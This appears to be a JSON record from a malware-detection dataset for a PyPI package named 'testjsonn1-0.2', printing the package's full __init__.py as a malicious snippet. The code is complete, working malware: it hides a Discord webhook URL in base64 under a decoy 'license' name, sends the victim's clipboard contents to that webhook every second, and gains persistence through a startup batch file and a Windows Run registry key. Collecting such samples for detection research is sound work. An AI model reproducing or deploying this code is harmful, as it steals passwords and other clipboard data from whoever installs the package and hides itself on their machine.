[
  {
    "pyfile": "__init__.py",
    "malicious_code_snippets": "import time\nimport pyperclip\nimport requests\nimport base64\nimport io\nimport os\nimport sys\nimport winreg as reg\n\ndef main():\n    licenseCD = '''aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTI2MjM5MTY1Mzk5MDE0MjAxMy9wNmVqSW1qRnhmMlJYakpPM3ZKQmg2VXZQQ2VuS2FsalhKMmR6SDFCd2NkYVdnT1BjR0lkSFY3eGNRWTIxWThoTzhZLQ=='''\n    strb = base64.b64decode(licenseCD)\n    mk = strb.decode('utf-8')\n    send_txt = \"\"\n    n = b'{\"content\": [\"Must be 2000 or fewer in length.\"]}'\n\n    if check_persistence('MyStartupScript'):\n        while True:\n            txt = pyperclip.paste()\n            if send_txt == txt:\n                time.sleep(1)\n            else:\n                data = {\n                    'content': f\"```{txt}```\"\n                }\n                response = requests.post(mk, data=data)\n                if response.content == n:\n                    file = io.BytesIO(txt.encode('utf-8'))\n                    file.name = 'filename.txt'\n                    payload = {\n                        \"file\": (file.name, file)\n                    }\n                    response = requests.post(mk, files=payload)\n                send_txt = txt\n            time.sleep(1)\n    else:\n        add_to_startup()\n\ndef add_to_startup():\n    script_path = os.path.abspath(sys.argv[0])\n    bat_path = os.path.join(os.getenv('APPDATA'), 'Microsoft\\\\Windows')\n    bat_name = 'startup_script.bat'\n\n    with open(os.path.join(bat_path, bat_name), 'w') as bat_file:\n        bat_file.write(f'@echo off\\nstart \"\" pythonw \"{script_path}\"\\nexit')\n\n    key = reg.HKEY_CURRENT_USER\n    sub_key = r'Software\\Microsoft\\Windows\\CurrentVersion\\Run'\n    reg_key = reg.OpenKey(key, sub_key, 0, reg.KEY_ALL_ACCESS)\n    reg.SetValueEx(reg_key, \"MyStartupScript\", 0, reg.REG_SZ, bat_path)\n    reg.CloseKey(reg_key)\n\ndef check_persistence(program_name):\n    hives = [\n        reg.HKEY_LOCAL_MACHINE,\n        reg.HKEY_CURRENT_USER\n    ]\n    paths = [\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\Run\",\n        r\"Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"\n    ]\n    for hive in hives:\n        for path in paths:\n            try:\n                with reg.OpenKey(hive, path, 0, reg.KEY_READ) as key:\n                    try:\n                        reg.QueryValueEx(key, program_name)\n                        return True\n                    except FileNotFoundError:\n                        continue\n            except FileNotFoundError:\n                continue\n    return False"
  },
  {
    "metadata": {
      "package_name": "testjsonn1-0.2",
      "report_path": "/home/blue/PyPIAgent/Codes/tooldetect/detect_output/guarddog/malware/testjsonn1-0.2.txt"
    }
  }
]